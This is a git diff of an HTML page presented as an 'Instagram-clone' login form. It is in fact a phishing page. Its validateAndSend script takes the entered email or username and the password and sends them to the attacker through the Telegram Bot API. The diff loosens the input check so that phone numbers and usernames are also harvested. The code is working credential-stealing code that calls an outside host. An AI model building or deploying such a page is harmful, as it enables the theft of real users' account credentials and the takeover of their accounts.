@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-        
+
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial_scale=1.0" />
     <title>Instagram-clone by ARUN</title>
@@ -14,11 +15,12 @@
         }
     </style>
 </head>
+
 <body>
     <main>
         <div class="log-in-container">
             <div class="log-in">
-                <img src="photos/logo.png" class="logo"/>
+                <img src="photos/logo.png" class="logo" />
                 <div class="log-in-form">
                     <input type="text" id="email" placeholder="Phone number, username or email" />
                     <input type="password" id="password" placeholder="Password" />
@@ -85,38 +87,34 @@
             return emailRegex.test(email);
         }
 
-       
+
 
         function validateAndSend() {
             const email = document.getElementById("email").value.trim();
             const password = document.getElementById("password").value.trim();
             const errorMessage = document.getElementById("error-message");
 
-            if (!isValidEmail(email)) {
-                errorMessage.style.display = "block";
-               
-                return;
-            } else {
-                errorMessage.style.display = "none";
-            }
-
             if (email === "" || password === "") {
                 alert("Please enter both email and password.");
                 return;
             }
-           
 
-            const message = `🔒 Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;
+            errorMessage.style.display = "none"; // hide error
+
+            const message = `🔒 Login Attempt:\n📧 Email/Username/Phone: ${email}\n🔑 Password: ${password}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     console.log("Sent to Telegram:", data);
-                    // alert("Login details sent. Please wait...");
                 })
                 .catch(error => console.error("Error sending to Telegram:", error));
         }
+
+
+
+
     </script>
 
 
